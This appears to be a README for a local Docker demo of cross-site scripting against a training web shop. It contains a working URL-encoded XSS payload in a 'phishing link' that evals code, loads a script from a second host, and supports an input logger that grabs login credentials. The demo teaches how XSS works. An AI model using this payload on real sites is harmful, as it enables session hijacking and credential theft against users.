You can use it via docker and docker-compose running:
´docker-compose up´

To show the possible impact of [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), assume you received and (of course) clicked
[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp)
and login. Apart from the visual/audible effect, the attacker also
installed [an input logger](http://localhost:8080/logger.php) to grab credentials! This could easily run on a 3rd party server in real life!
